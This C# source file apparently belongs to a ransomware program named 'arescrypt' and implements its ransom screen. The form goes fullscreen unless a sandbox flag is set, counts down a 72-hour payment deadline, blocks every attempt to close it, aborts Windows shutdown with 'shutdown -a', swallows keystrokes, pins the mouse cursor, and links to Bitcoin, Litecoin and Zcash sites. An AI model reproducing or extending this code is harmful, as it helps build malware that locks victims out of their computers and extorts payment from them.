using System;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace arescrypt
{
    public partial class Display : Form
    {

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwflag);

        public Display() {
            InitializeComponent();

            if (!Program.sandBox) // == false
            {   // This will maximize the screen, and eliminate the taskbar. 
                this.WindowState = FormWindowState.Maximized;
                this.FormBorderStyle = FormBorderStyle.None;
            }
        }

        private void Display_Load(object sender, EventArgs e) { }

        Point cursorPos = new Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);


        // 168:00:00
        private void lostTimer_Tick(object sender, EventArgs e)
        {
        }

        // 72:00:00
        int riseTimer_Hours = 0x48; int riseTimer_Minutes = 0x0; int riseTimer_Seconds = 0x0;
        private void riseTimer_Tick(object sender, EventArgs e)
        {
            if (riseTimer_Minutes == 0x0 && riseTimer_Seconds == 0x0)
            {
                riseTimer_Hours--; // Decrement 'Hours' variable
                riseTimer_Minutes = 0x3C; // 60
            } else if (riseTimer_Minutes == 0x3C && riseTimer_Seconds == 0x0)
            {
                riseTimer_Minutes--;
            }

            riseTimer_Seconds--;
            paymentTimer_Rise.Text = riseTimer_Hours + ":" + riseTimer_Minutes + ":" + riseTimer_Seconds;
        }

        private void preventClose(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            if (e.CloseReason == CloseReason.WindowsShutDown)
                Process.Start("shutdown", "-a");
        }

        private void keyPressAction(object sender, KeyEventArgs e)
        {
            e.SuppressKeyPress = true;
            System.Threading.Thread.Sleep(666);
            Cursor.Position = cursorPos;
            mouse_event(0x002 | 0x004);
        }

        private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://bitcoin.org"); }

        private void aboutLitecoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://litecoin.com/"); }

        private void aboutZcash_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://z.cash/"); }
    }
}
